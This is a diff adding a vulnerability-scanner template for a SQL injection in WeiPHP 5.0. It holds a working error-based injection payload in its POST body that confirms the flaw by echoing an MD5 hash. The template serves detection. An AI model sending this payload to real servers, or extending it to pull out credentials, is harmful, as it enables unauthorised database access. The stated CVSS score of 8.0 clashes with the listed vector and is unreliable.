@@ -1,0 +1,29 @@
+id: weiphp-group-id-sqli
+info:
+  name: WeiPHP _send_by_group SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WeiPHP version 5.0 has a SQL injection vulnerability in the _send_by_group endpoint. This allows an attacker to extract sensitive database information, such as usernames and passwords.
+  reference:
+    - http://www.weiphp.cn/
+  classification:
+    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 8.0
+  tags: sql, sqli
+http:
+  - method: POST
+    path:
+      - "/public/index.php/weixin/message/_send_by_group"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "group_id[0]=exp&group_id[1]=) and updatexml(1,concat(0x7e,md5(123),0x7e),1) --"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b7"
